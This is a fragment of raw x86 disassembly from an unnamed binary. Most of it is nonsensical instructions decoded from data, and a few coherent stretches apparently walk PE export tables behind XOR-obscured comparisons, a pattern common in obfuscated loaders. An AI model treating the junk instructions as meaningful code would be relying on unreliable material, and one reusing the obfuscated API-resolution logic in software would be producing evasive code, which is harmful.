  408d77:	xchg   BYTE PTR [edx+0x1a0fd8b1],ch
  408d7d:	xchg   ebx,eax
  408d7e:	and    DWORD PTR [edx],0x163c377f
  408d84:	push   es
  408d85:	xor    ebp,ebx
  408d87:	cmp    eax,0x2da07489
  408d8c:	or     DWORD PTR [ebx-0x3f45f5c3],0x1edc0b92
  408d96:	pop    edx
  408d97:	jecxz  0x408d98
  408d99:	jg     0x408db2
  408d9b:	test   bh,0x67
  408d9e:	repz dec esp
  408da0:	lods   al,BYTE PTR ds:[esi]
  408da1:	adc    esi,DWORD PTR ds:0xd00c6a8
  408da7:	or     edx,edi
  408da9:	jp     0x408df8
  408dab:	xor    cl,0xed
  408dae:	mov    DWORD PTR [ebx+ecx*4],0xef456f97
  408db5:	jg     0x408e00
  408db7:	fmul   QWORD PTR [ecx+0x2f]
  408dba:	mov    al,0x28
  408dbc:	and    eax,0xb84c2eea
  408dc1:	js     0x408e2c
  408dc3:	or     al,0x3
  408dc5:	cld    
  408dc6:	test   eax,0x79f15a4
  408dcb:	mov    eax,0xf8d50c30
  408dd0:	out    dx,eax
  408dd1:	mov    BYTE PTR [edi-0x53],bl
  408dd4:	jnp    0x408ddc
  408dd6:	push   ss
  408dd7:	stos   BYTE PTR es:[edi],al
  408dd8:	jle    0x408e4d
  408dda:	or     BYTE PTR [esi],ah
  408ddc:	mov    bl,0x21
  408dde:	mov    bh,BYTE PTR ds:0xf7ab086a
  408de4:	adc    esp,DWORD PTR [eax+0x5c8b69d9]
  408dea:	push   0xb03cf055
  408def:	fisttp DWORD PTR [eax+eax*4-0x80]
  408df3:	cmp    al,0xcf
  408df5:	xor    dh,BYTE PTR [ecx]
  408df7:	std    
  408df8:	mov    BYTE PTR [ecx],bl
  408dfa:	jecxz  0x408e58
  408dfc:	sbb    DWORD PTR [ecx+0x1a978e0c],edi
  408e02:	inc    edi
  408e03:	jne    0x408e48
  408e05:	aad    0x20
  408e07:	mov    ch,0xf3
  408e09:	iret   
  408e0a:	fldz   
  408e0c:	adc    BYTE PTR ds:0xbf772179,ah
  408e12:	pop    ebp
  408e13:	inc    edi
  408e14:	addr16 push es
  408e16:	sbb    al,0xb4
  408e18:	xor    DWORD PTR [edx+eax*8],edi
  408e1b:	iret   
  408e1c:	adc    eax,DWORD PTR [eax-0x4a67cbda]
  408e22:	fdiv   st(3),st
  408e24:	in     al,0x4a
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x17067303
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	hlt    
  408ec5:	push   0xffffffa2
  408ec7:	cli    
  408ec8:	xor    ebx,DWORD PTR [edi-0x6e603a5e]
  408ece:	test   eax,0xfac95d78
  408ed3:	xchg   ecx,eax
  408ed4:	mov    BYTE PTR [ebx+0x7311753e],cl
  408eda:	mov    esp,0xab76d515
  408edf:	xchg   DWORD PTR [eax-0x39],edx
  408ee2:	fsubr  QWORD PTR [eax+0x31]
  408ee5:	enter  0x86af,0xb4
  408ee9:	test   edx,0x1a35d0e2
  408eef:	sbb    ecx,DWORD PTR [esi+0x3c32346e]
  408ef5:	pop    edx
  408ef6:	repz rcr DWORD PTR [ebx],1
  408ef9:	inc    ebp
  408efa:	add    BYTE PTR [esi+0x58e0120c],dh
  408f00:	xor    bh,ch
  408f02:	push   esi
  408f03:	cwde   
  408f04:	dec    ecx
  408f05:	test   eax,0xc34b25b2
  408f0a:	adc    ebp,edx
  408f0c:	xchg   ebp,eax
  408f0d:	mov    esi,0x4c6bea76
  408f12:	sbb    eax,0xdd918fd2
  408f17:	cmc    
  408f18:	or     cl,BYTE PTR [esi+eiz*4-0x55]
  408f1c:	stos   DWORD PTR es:[edi],eax
  408f1d:	jmp    0xfa3a:0x3c082773
  408f24:	test   BYTE PTR [edx],dh
  408f26:	xchg   ebx,eax
  408f27:	sbb    ch,BYTE PTR [ecx+0x51e87495]
  408f2d:	sar    DWORD PTR [ecx+0xc],0x3d
  408f31:	rcl    DWORD PTR [ebp+edi*2-0x2d],cl
  408f35:	push   ecx
  408f36:	stos   BYTE PTR es:[edi],al
  408f37:	shl    DWORD PTR [edi-0x7fd02943],cl
  408f3d:	and    eax,DWORD PTR [edi-0x2b24a6f1]
  408f43:	xor    al,0x50
  408f45:	push   0x1893de99
  408f4a:	mov    al,0x87
  408f4c:	fild   WORD PTR [edi]
  408f4e:	out    dx,eax
  408f4f:	pop    esi
  408f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f51:	es mov ch,0xbf
  408f54:	add    DWORD PTR [edx+ecx*1],esi
  408f57:	inc    esp
  408f58:	aaa    
  408f59:	mov    ebx,0x318e36b4
  408f5e:	sub    BYTE PTR [edi-0x62],ch
  408f61:	hlt    
  408f62:	push   eax
  408f63:	int    0x15
  408f65:	jge    0x408eff
  408f67:	jns    0x408fa0
  408f69:	jg     0x408fdc
  408f6b:	sub    DWORD PTR [edi+0x4edb989d],0xaf160b3d
  408f75:	sbb    ecx,ecx
  408f77:	adc    bh,BYTE PTR [edi-0x1e]
  408f7a:	fst    DWORD PTR ds:0x17c1ee94
  408f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f81:	pusha  
  408f82:	add    eax,0xac99bddd
  408f87:	pop    esp
  408f88:	out    dx,al
  408f89:	shl    bl,0x34
  408f8c:	out    dx,eax
  408f8d:	pop    esi
  408f8e:	cmp    bh,BYTE PTR [esi]
  408f90:	jmp    0x2f9c4fa1
  408f95:	pop    ecx
  408f96:	or     BYTE PTR [esi-0x7b1a1ed7],bh
  408f9c:	inc    edx
  408f9d:	jmp    0xa2934f0e
  408fa2:	push   cs
  408fa3:	add    eax,0xcf35ee2
  408fa8:	mov    ebp,0x57fdc8a2
  408fad:	dec    ebx
  408fae:	aam    0x85
  408fb0:	xor    BYTE PTR [edx],cl
  408fb2:	add    DWORD PTR [edx+0x6bd8bb5],esp
  408fb8:	dec    esi
  408fb9:	sub    al,0x37
  408fbb:	stos   BYTE PTR es:[edi],al
  408fbc:	or     eax,0x3a36b2d5
  408fc1:	cwde   
  408fc2:	int3   
  408fc3:	fucomip st,st(0)
  408fc5:	nop
  408fc6:	idiv   BYTE PTR [ebx]
  408fc8:	dec    ecx
  408fc9:	lahf   
  408fca:	inc    ebp
  408fcb:	xchg   BYTE PTR [ebx+0x2d3ff4f7],bh
  408fd1:	or     al,BYTE PTR [ebx-0x30]
  408fd4:	and    eax,0xa8de37d
  408fd9:	(bad)  
  408fda:	in     eax,0xaa
  408fdc:	xchg   esi,eax
  408fdd:	test   al,0xe3
  408fdf:	aaa    
  408fe0:	ror    DWORD PTR [eax-0x3],cl
  408fe3:	xchg   ebp,eax
  408fe4:	retf   
  408fe5:	and    al,0x73
  408fe7:	fimul  DWORD PTR [eax+0x65264f38]
  408fed:	repnz mov ebp,0x34099993
  408ff3:	cmp    al,0x4
  408ff5:	adc    DWORD PTR [edx],eax
  408ff7:	pop    esp
  408ff8:	xchg   esi,eax
  408ff9:	mov    al,0xb2
  408ffb:	mov    DWORD PTR [ebp+0x515ed474],ebp
  409001:	add    DWORD PTR [edi],edx
  409003:	test   eax,0xaaaf9755
  409008:	mov    al,0xab
  40900a:	sbb    al,0x1d
  40900c:	rcr    BYTE PTR [esi-0x26dbc344],cl
  409012:	(bad)  
  409014:	mov    ebp,DWORD PTR es:[esi+0x6853c953]
  40901b:	shl    DWORD PTR [eax-0x4f],cl
  40901e:	mov    dh,0x31
  409020:	retf   0xf892
  409023:	jns    0x40900c
  409025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409026:	cmp    esi,DWORD PTR [esi+0x7c9c5566]
  40902c:	fistp  QWORD PTR [ecx-0x353464cc]
  409032:	adc    BYTE PTR [ecx],bh
  409034:	dec    esp
  409035:	sbb    ebp,DWORD PTR [edi+0x511205aa]
  40903b:	loope  0x409014
  40903d:	jo     0x408ffc
  40903f:	imul   edi,DWORD PTR [esi-0x42],0x8c7f9ae7
  409046:	mov    esp,0x14367d31
  40904b:	jae    0x4090a7
  40904d:	jmp    0x5158:0x6dc8ab7b
  409054:	or     al,0x44
  409056:	sub    bl,0x33
  409059:	out    0x9e,eax
  40905b:	or     al,0xc6
  40905d:	cmp    BYTE PTR [ebp-0x4b],al
  409060:	and    esi,DWORD PTR [ecx-0x50]
  409063:	out    dx,al
  409064:	lds    esi,FWORD PTR [edi-0x1c]
  409067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409068:	(bad)  
  409069:	in     eax,dx
  40906a:	jmp    0x409061
  40906c:	xor    al,0xa5
  40906e:	adc    cl,BYTE PTR [eax]
  409070:	add    al,0x9c
  409072:	js     0x40905d
  409074:	out    0x2a,eax
  409076:	fsubr  DWORD PTR [ecx-0x61]
  409079:	push   cs
  40907a:	xlat   BYTE PTR ds:[ebx]
  40907b:	pop    ds
  40907c:	popf   
  40907d:	ins    BYTE PTR es:[edi],dx
  40907e:	test   BYTE PTR [eax-0x5d8c07bb],ch
  409084:	jg     0x409083
  409086:	pusha  
  409087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409088:	jo     0x409017
  40908a:	call   0xf9c113a0
  40908f:	or     eax,0xd3de0207
  409094:	clc    
  409095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409096:	aam    0x3d
  409098:	cmp    dl,BYTE PTR [ebx+0x5c506fb]
  40909e:	jg     0x4090ea
  4090a0:	push   ecx
  4090a1:	sub    esi,DWORD PTR [ecx+edi*1-0x62]
  4090a5:	pusha  
  4090a6:	mov    dh,0xbd
  4090a8:	push   ds
  4090a9:	bnd je 0x4090f4
  4090ac:	repz push DWORD PTR [edx+0x29]
  4090b0:	call   0x6c5108db
  4090b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b6:	int3   
  4090b7:	std    
  4090b8:	sbb    BYTE PTR [edi+0xa280b2e],dh
  4090be:	or     ecx,ecx
  4090c0:	push   esp
  4090c1:	pop    esi
  4090c2:	mov    ah,0x99
  4090c4:	fnstenv [edi+0x3e]
  4090c7:	(bad)  
  4090c8:	xchg   ebx,eax
  4090c9:	and    BYTE PTR [esi+ebx*1+0x6c],dh
  4090cd:	add    ebx,0x3aaa6db8
  4090d3:	mul    ecx
  4090d5:	aas    
  4090d6:	or     cl,BYTE PTR [ecx]
  4090d8:	leave  
  4090d9:	sbb    DWORD PTR [ebp-0x73],eax
  4090dc:	ss xor al,0x7d
  4090df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e0:	jmp    DWORD PTR [ecx-0x4d]
  4090e3:	cmp    edi,DWORD PTR [esi]
  4090e5:	inc    edx
  4090e6:	dec    esi
  4090e7:	cmc    
  4090e8:	push   0xfffffffc
  4090ea:	mov    ah,0x43
  4090ec:	mov    bl,0x9b
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xee
  409163:	cmp    al,BYTE PTR [ebp+0x7edf3208]
  409169:	jle    0x40918f
  40916b:	jl     0x4091eb
  40916d:	jle    0x409113
  40916f:	fistp  DWORD PTR [esi-0x2e]
  409172:	xor    BYTE PTR [ebp-0x49754325],cl
  409178:	pop    esp
  409179:	ins    DWORD PTR es:[edi],dx
  40917a:	imul   ebx,DWORD PTR [esi],0x6ba2ef95
  409180:	out    dx,al
  409181:	sbb    DWORD PTR [ebp-0x16],0xbc9155c6
  409188:	xchg   esi,eax
  409189:	(bad)  [ebx]
  40918b:	inc    esp
  40918c:	add    eax,0x52e7aa2b
  409191:	shl    dl,0xc6
  409194:	pop    esi
  409195:	lds    esp,FWORD PTR [ebx-0x1c]
  409198:	fild   QWORD PTR fs:[ebp+0x21955aed]
  40919f:	xor    al,0xde
  4091a1:	sbb    al,BYTE PTR ds:0x2324680e
  4091a7:	(bad)  
  4091a8:	hlt    
  4091a9:	jne    0x4091c4
  4091ab:	pop    edi
  4091ac:	xor    esi,esp
  4091ae:	add    al,0xb9
  4091b0:	adc    al,0x62
  4091b2:	add    esi,eax
  4091b4:	(bad)  
  4091b5:	xor    BYTE PTR ds:0x2547d83e,dh
  4091bb:	xchg   edi,eax
  4091bc:	mov    ebp,0xbec1fa46
  4091c1:	xchg   ecx,eax
  4091c2:	out    0x73,al
  4091c4:	pusha  
  4091c5:	pop    esp
  4091c6:	loop   0x409203
  4091c8:	mov    edi,0x7a444fa1
  4091cd:	into   
  4091ce:	mov    esi,0x875884ee
  4091d3:	inc    ecx
  4091d4:	jmp    0xc827684f
  4091d9:	jb     0x409195
  4091db:	je     0x409227
  4091dd:	jne    0x409215
  4091df:	mov    eax,ds:0xe2a4472d
  4091e4:	fild   DWORD PTR [edx]
  4091e6:	xor    al,0x61
  4091e8:	nop
  4091e9:	ins    BYTE PTR es:[edi],dx
  4091ea:	les    edx,FWORD PTR [edx+0x20]
  4091ed:	xchg   esi,eax
  4091ee:	mov    DWORD PTR ds:0x15a5fa80,esi
  4091f4:	sbb    BYTE PTR [esi+0xc4c1152],bh
  4091fa:	xlat   BYTE PTR ds:[ebx]
  4091fb:	jmp    0x803c0c5b
  409200:	lods   eax,DWORD PTR ds:[esi]
  409201:	mov    DWORD PTR [eax-0x324f5872],edx
  409207:	jbe    0x409210
  409209:	scas   eax,DWORD PTR es:[edi]
  40920a:	push   ss
  40920b:	jge    0x409276
  40920d:	adc    eax,0x6880f845
  409212:	daa    
  409213:	mov    bl,BYTE PTR [eax+ecx*4+0x684c7d51]
  40921a:	call   0x59fb56b
  40921f:	jo     0x4091c6
  409221:	add    cl,BYTE PTR [ebx-0x1c10008d]
  409227:	ret    0x5327
  40922a:	dec    edx
  40922b:	sti    
  40922c:	(bad)  
  40922d:	push   eax
  40922e:	test   DWORD PTR [ebx-0x66216959],0x49a63a89
  409238:	push   0xb53691f8
  40923d:	sbb    al,0x35
  40923f:	(bad)  
  409241:	test   eax,0x32111506
  409246:	push   esi
  409247:	mov    dh,BYTE PTR [eax]
  409249:	or     dl,BYTE PTR [eax-0x51]
  40924c:	sub    BYTE PTR [eax+0x70],dl
  40924f:	cwde   
  409250:	xchg   edx,eax
  409251:	aaa    
  409252:	in     al,dx
  409253:	cli    
  409254:	push   ecx
  409255:	adc    ch,bh
  409257:	push   ebp
  409258:	sbb    ch,dh
  40925a:	stc    
  40925b:	pop    es
  40925c:	mov    cl,0x31
  40925e:	sbb    ah,BYTE PTR [ecx-0x3c]
  409261:	and    ebx,esi
  409263:	fdiv   QWORD PTR [ebx-0x356eebb]
  409269:	stc    
  40926a:	dec    esp
  40926b:	fcom   QWORD PTR [edx]
  40926d:	(bad)  
  40926e:	test   eax,0x83fe435
  409273:	sub    eax,0xa91529db
  409278:	inc    esi
  409279:	xchg   ebp,eax
  40927a:	xor    dh,BYTE PTR [eax-0x7c]
  40927d:	std    
  40927e:	lock sbb bl,0x19
  409282:	test   eax,0xa6501eb0
  409287:	and    DWORD PTR [ecx],ebp
  409289:	xor    ch,BYTE PTR [esi]
  40928b:	int    0x15
  40928d:	push   0x6ad35f84
  409292:	aad    0x13
  409294:	push   0xffffffe8
  409296:	or     al,BYTE PTR [ecx-0x1b]
  409299:	shr    edx,1
  40929b:	fcomi  st,st(0)
  40929d:	inc    ebx
  40929e:	push   cs
  40929f:	fdivrp st(7),st
  4092a1:	pop    esp
  4092a2:	jo     0x4092c1
  4092a4:	sub    ebp,ebx
  4092a6:	or     al,0x13
  4092a8:	int    0x30
  4092aa:	sub    esi,ebp
  4092ac:	std    
  4092ad:	mov    edx,0x4b625aa8
  4092b2:	js     0x40924f
  4092b4:	cwde   
  4092b5:	(bad)  
  4092b6:	and    ecx,DWORD PTR cs:[ebp+0x41]
  4092ba:	int3   
  4092bb:	cwde   
  4092bc:	imul   eax,DWORD PTR ds:0x1346950b,0x3a4c86de
  4092c6:	xor    BYTE PTR [ebx-0x45f3c21],0x5
  4092cd:	add    al,0x7a
  4092cf:	sbb    ebp,DWORD PTR [edx+0x4f]
  4092d2:	add    al,0xad
  4092d4:	ret    0xfa47
  4092d7:	inc    edi
  4092d8:	mov    edi,0x7a93970
  4092dd:	call   0xef6f:0x8f7146da
  4092e4:	mov    ds:0x5521d60b,eax
  4092e9:	push   esi
  4092ea:	mov    eax,edi
  4092ec:	mov    ds:0x76c448dc,eax
  4092f1:	pop    esi
  4092f2:	pop    es
  4092f3:	fnsave ds:0x1a498a1c
  4092f9:	xchg   edi,eax
  4092fa:	test   DWORD PTR [ebx-0x5f],edx
  4092fd:	dec    edx
  4092fe:	jb     0x4092df
  409300:	fistp  DWORD PTR [edi+eiz*4]
  409303:	shr    bh,0x95
  409306:	jp     0x4092e9
  409308:	in     eax,dx
  409309:	in     al,0xa5
  40930b:	add    BYTE PTR [edi-0x707846d0],ch
  409311:	xlat   BYTE PTR ds:[ebx]
  409312:	test   DWORD PTR [edx-0x31929eff],edi
  409318:	push   es
  409319:	jne    0x4092da
  40931b:	test   eax,0xf8cc40c9
  409320:	inc    edi
  409321:	pop    edx
  409322:	into   
  409323:	mov    ds:0xf0934722,eax
  409328:	leave  
  409329:	mov    edx,ecx
  40932b:	push   ss
  40932c:	jns    0x4092c7
  40932e:	mov    DWORD PTR [esi],esi
  409330:	push   ebp
  409331:	or     al,0xa1
  409333:	sti    
  409334:	mov    BYTE PTR [edx],ch
  409336:	xlat   BYTE PTR ds:[ebx]
  409337:	fwait
  409338:	jae    0x40932e
  40933a:	std    
  40933b:	mov    ch,0x52
  40933d:	call   FWORD PTR [esi-0x15e1b2ba]
  409343:	mov    fs,WORD PTR ds:0xf1e7f243
  409349:	pop    ecx
  40934a:	add    ecx,DWORD PTR [eax]
  40934c:	xchg   esp,eax
  40934d:	ret    
  40934e:	outs   dx,BYTE PTR ds:[esi]
  40934f:	push   0xa1181972
  409354:	inc    edi
  409355:	or     eax,0xde2cbbc1
  40935a:	stos   DWORD PTR es:[edi],eax
  40935b:	xchg   ecx,eax
  40935c:	add    BYTE PTR [ebp+ecx*4-0xe],ch
  409360:	rcl    DWORD PTR [edi],0xe9
  409363:	inc    esp
  409364:	xor    ebp,DWORD PTR [edx+0x78]
  409367:	push   ecx
  409368:	cmp    bh,al
  40936a:	ins    BYTE PTR es:[edi],dx
  40936b:	inc    edx
  40936c:	sub    BYTE PTR fs:[ecx+0x62999080],0x4b
  409374:	addr16 xor edi,eax
  409377:	int    0x1f
  409379:	dec    edx
  40937a:	jle    0x4093f4
  40937c:	mov    al,0x9
  40937e:	cdq    
  40937f:	int3   
  409380:	add    eax,0xd4777ec2
  409385:	jbe    0x409320
  409387:	or     DWORD PTR [ecx+0x41],eax
  40938a:	mov    edi,0xc728952b
  40938f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409390:	xchg   ecx,eax
  409391:	in     al,dx
  409392:	and    BYTE PTR [edi-0x7a],cl
  409395:	je     0x40938c
  409397:	mov    WORD PTR [ecx+0xc458b08],cs
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	xchg   esp,eax
  4093b5:	xor    eax,0xddd88168
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	js     0x40934b
  4093c2:	cmp    BYTE PTR [ebx-0x71],ah
  4093c5:	ret    
  4093c6:	fisubr DWORD PTR [edx+0x3d]
  4093c9:	mov    bh,0x71
  4093cb:	shl    DWORD PTR [edx],cl
  4093cd:	jb     0x409390
  4093cf:	fmul   QWORD PTR [edi]
  4093d1:	add    DWORD PTR [ecx-0x2daba24c],edi
  4093d7:	mov    dl,0x27
  4093d9:	into   
  4093da:	add    eax,0xd6fafa3c
  4093df:	adc    eax,0xd08efd91
  4093e4:	leave  
  4093e5:	and    al,0xcd
  4093e7:	sub    BYTE PTR [edi+0x6b],bh
  4093ea:	pop    esi
  4093eb:	call   0xe621:0x1c9dd781
  4093f2:	clc    
  4093f3:	cdq    
  4093f4:	jb     0x40942b
  4093f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093f7:	mov    al,ds:0x53501c
  4093fc:	sbb    ebx,eax
  4093fe:	mov    bl,0x81
  409400:	dec    esp
  409401:	jo     0x4093fa
  409403:	push   cs
  409404:	arpl   sp,dx
  409406:	stc    
  409407:	shl    edi,0xeb
  40940a:	(bad)  
  40940b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40940c:	pop    ebx
  40940d:	or     DWORD PTR [ebx+eiz*2],0xf667fd45
  409414:	cmp    BYTE PTR [ecx-0x3f1fe0d1],0xdb
  40941b:	mov    eax,ds:0x16649357
  409420:	lea    edi,[esi+0x7a]
  409423:	and    al,0x62
  409425:	push   edi
  409426:	hlt    
  409427:	mov    dl,0x16
  409429:	das    
  40942a:	scas   al,BYTE PTR es:[edi]
  40942b:	xor    eax,0x2a57a8e9
  409430:	push   ebp
  409431:	outs   dx,BYTE PTR ds:[esi]
  409432:	ja     0x40946c
  409434:	popf   
  409435:	xchg   ebx,eax
  409436:	jae    0x409473
  409438:	mov    ds:0x203d166a,eax
  40943d:	sahf   
  40943e:	stos   BYTE PTR es:[edi],al
  40943f:	mov    ?,edi
  409441:	adc    al,0x4d
  409443:	add    BYTE PTR [esi+0x65b0d985],ah
  409449:	out    dx,al
  40944a:	xor    dh,BYTE PTR [ecx+edx*2]
  40944d:	mov    cl,0x9f
  40944f:	aaa    
  409450:	daa    
  409451:	sbb    DWORD PTR [ebx+ecx*8],esp
  409454:	lea    esp,[ebx+0x5a]
  409457:	mov    edx,0x4114ecbb
  40945c:	or     DWORD PTR [esi+0x1b],0x3e0cda9c
  409463:	fwait
  409464:	pop    edx
  409465:	jl     0x409451
  409467:	ins    BYTE PTR es:[edi],dx
  409468:	pop    ds
  409469:	jnp    0x40942a
  40946b:	jmp    0x9e0e:0x660ef875
  409472:	nop
  409473:	call   ebp
  409475:	sub    bh,BYTE PTR [esi]
  409477:	imul   edx,edx,0x83e9d89a
  40947d:	add    ch,dh
  40947f:	jne    0x40940f
  409481:	mov    bl,0xe5
  409483:	pushf  
  409484:	xor    dl,al
  409486:	pop    ecx
  409487:	jo     0x4094fa
  409489:	pop    edi
  40948a:	popf   
  40948b:	lea    ecx,[ebx+0x77]
  40948e:	ss jne 0x40945a
  409491:	sbb    DWORD PTR [ecx-0xf],ebp
  409494:	and    DWORD PTR [esi+0x42],0xdf394c3c
  40949b:	scas   al,BYTE PTR es:[edi]
  40949c:	xor    al,0x62
  40949e:	push   esi
  40949f:	add    DWORD PTR [edi],eax
  4094a1:	dec    ebx
  4094a2:	or     bl,al
  4094a4:	lock ins BYTE PTR es:[edi],dx
  4094a6:	or     esp,DWORD PTR [ecx+0x37]
  4094a9:	(bad)  
  4094aa:	mov    edi,DWORD PTR [esi-0x34]
  4094ad:	dec    esp
  4094ae:	dec    edi
  4094af:	sbb    DWORD PTR fs:[edi+0x1b],0xffffff86
  4094b4:	repnz leave 
  4094b6:	ja     0x4094b0
  4094b8:	jbe    0x4094ad
  4094ba:	aad    0xf7
  4094bc:	dec    eax
  4094bd:	test   DWORD PTR [edi-0xc96ff7e],ecx
  4094c3:	fnsave [edi-0x5f9d2c3a]
  4094c9:	lahf   
  4094ca:	jmp    0xb1c4:0xf979f30e
  4094d1:	out    dx,eax
  4094d2:	ins    BYTE PTR es:[edi],dx
  4094d3:	cdq    
  4094d4:	cmp    al,0xe7
  4094d6:	mov    al,0x57
  4094d8:	push   ebx
  4094d9:	jge    0x40950c
  4094db:	inc    ebp
  4094dc:	leave  
  4094dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094de:	jmp    0xe0ffbd96
  4094e3:	iret   
  4094e4:	leave  
  4094e5:	(bad)  
  4094e6:	push   esi
  4094e7:	es jmp 0x801f7c69
  4094ed:	(bad)  
  4094ee:	sar    DWORD PTR [ecx-0x5f],1
  4094f1:	pop    ss
  4094f2:	cs mov al,0x56
  4094f5:	retf   
  4094f6:	xchg   esi,eax
  4094f7:	out    0xb5,al
  4094f9:	mov    ds:0xc5182fbe,al
  4094fe:	mov    al,ds:0xb2bb3514
  409503:	fadd   DWORD PTR [ecx-0xe]
  409506:	add    bl,al
  409508:	mov    eax,ds:0xdffd446d
  40950d:	mov    cl,0xe9
  40950f:	xor    bh,BYTE PTR [ecx+0x51d3b16f]
  409515:	in     eax,0x9f
  409517:	pop    ss
  409518:	pop    ecx
  409519:	mov    cl,0xc9
  40951b:	inc    eax
  40951c:	mov    eax,ds:0xae26a2a2
  409521:	ficom  WORD PTR [ecx+0x6a]
  409524:	scas   al,BYTE PTR es:[edi]
  409525:	cs fwait
  409527:	jmp    0x409518
  409529:	push   edi
  40952a:	xor    BYTE PTR [edx-0x6d],al
  40952d:	iret   
  40952e:	jl     0x4094fb
  409530:	rcr    DWORD PTR [edx],0xb6
  409533:	ret    
  409534:	pop    edx
  409535:	cli    
  409536:	dec    esi
  409537:	repz fsubp st(5),st
  40953a:	xchg   esp,eax
  40953b:	loope  0x4095b2
  40953d:	pop    ecx
  40953e:	or     eax,0x15175de8
  409543:	mov    esi,0x72a219fe
  409548:	push   es
  409549:	adc    BYTE PTR [eax],ch
  40954b:	arpl   WORD PTR [edi],ax
  40954d:	sub    eax,0x131fb4d3
  409552:	add    BYTE PTR [edx],ah
  409554:	jmp    0x40953b
  409556:	sbb    ch,BYTE PTR [edi+0x61589635]
  40955c:	pop    ds
  40955d:	call   0x9ab1c947
  409562:	test   eax,0x4737fe57
  409567:	cmp    eax,0x86599b82
  40956c:	add    eax,0x51f49376
  409571:	inc    ebx
  409572:	pop    esi
  409573:	leave  
  409574:	mov    edi,0x4265b538
  409579:	or     eax,ebp
  40957b:	cmp    edx,eax
  40957d:	xor    esi,DWORD PTR [eax-0x2f]
  409580:	or     eax,0x990579ee
  409585:	xlat   BYTE PTR ds:[ebx]
  409586:	xchg   ecx,eax
